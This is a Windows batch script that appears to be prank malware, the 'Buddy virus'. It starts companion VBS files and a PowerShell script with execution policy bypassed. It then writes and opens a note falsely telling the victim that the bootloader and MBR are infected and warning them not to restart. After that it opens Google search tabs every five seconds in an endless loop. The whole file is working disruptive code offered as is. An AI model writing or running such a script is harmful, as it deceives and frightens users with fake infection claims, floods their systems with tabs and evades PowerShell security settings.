@echo off

start "" "%~dp0\kick.vbs"
echo Your computer has been messed up by the Buddy virus :). Don't try to turn it off or restart it; the bootloader and some essential programs for your Windows have been infected, including a part of your MBR! Lol! :)) >> Buddy2you.txt
start powershell.exe -ExecutionPolicy Bypass -File "%~dp0\cab.ps1"
start "" "%~dp0\Line.vbs"
Buddy2you.txt
setlocal enabledelayedexpansion

:loop
set /a "randomNumber=!random! %% 10"

if !randomNumber! lss 3 (
    start "" "https://www.google.com/search?client=firefox-b-d&q=Buddy"
    timeout /t 5 /nobreak > nul
) else if !randomNumber! lss 6 (
    start "" "https://www.google.com/search?q=Cabrito+hacks+your+computer&client=firefox-b-d&sca_esv=577644912&tbm=nws&sxsrf=AM9HkKlylfVNvFxlmReG5YxlhFH_4yeeqQ:1698604862264&source=lnms&sa=X&ved=2ahUKEwjl1bab9JuCAxWjsJUCHb_NBCoQ_AUoBHoECAEQBg&biw=1366&bih=616&dpr=1"
    timeout /t 5 /nobreak > nul
) else (
    start "" "https://www.google.com/search?q=kick+the+buddy&tbm=isch&ved=2ahUKEwjtjYr2jIOCAxUam5UCHWHFD90Q2-cCegQIABAA&oq=kick+the+buddy&gs_lcp=CgNpbWcQAzIECCMQJzIECCMQJzIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEUKcGWI4LYMoWaABwAHgAgAHKAYgBvAiSAQUwLjQuMpgBAKABAaoBC2d3cy13aXotaW1nwAEB&sclient=img&ei=taUxZa3fFZq21sQP4Yq_6A0&bih=616&biw=1366"
    timeout /t 5 /nobreak > nul
)

goto :loop

